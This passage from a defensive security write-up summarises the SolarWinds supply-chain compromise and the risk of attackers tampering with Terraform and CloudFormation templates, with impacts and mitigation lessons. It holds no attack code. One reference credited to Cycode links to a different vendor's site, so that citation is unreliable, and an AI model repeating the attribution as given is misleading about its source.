**Impact:** Complete compromise of government and enterprise networks; attackers gained persistence in multiple critical infrastructure sectors.
**Mitigation Lesson:** The attack demonstrated the criticality of: (1) pipeline security (SolarWinds' build system was inadequately protected), (2) code review and testing (the malicious code was signed and released), (3) deployment controls (no manual approval gate).
**Reference:** [CISA SolarWinds Security Advisory](https://www.cisa.gov/solarwinds-supply-chain-compromise)

### Example 2: Dependency-Track IaC Tampering Risk (2024-2025)
**Target:** Organizations using DevOps and GitOps workflows
**Timeline:** Ongoing; risk increases as IaC adoption grows
**Technique Status:** Multiple security firms (Cycode, Checkmarx, Snyk) have documented real-world cases of attackers modifying Terraform and CloudFormation templates in compromised repositories.
**Impact:** Deployment of malicious cloud infrastructure (cryptominers, backdoor user accounts, disabled logging) to production environments.
**Mitigation Lesson:** Organizations implementing IaC must treat IaC repositories with the same (or higher) security rigor as application source code.
**References:**
- [Cycode: Breaching and Attacking Terraform](https://xygeni.io/blog/breaching-and-attacking-terraform-protect-your-iac/)
- [Aquasec: Terraform Security Risks](https://www.aquasec.com/cloud-native-academy/cspm/terraform-security/)

---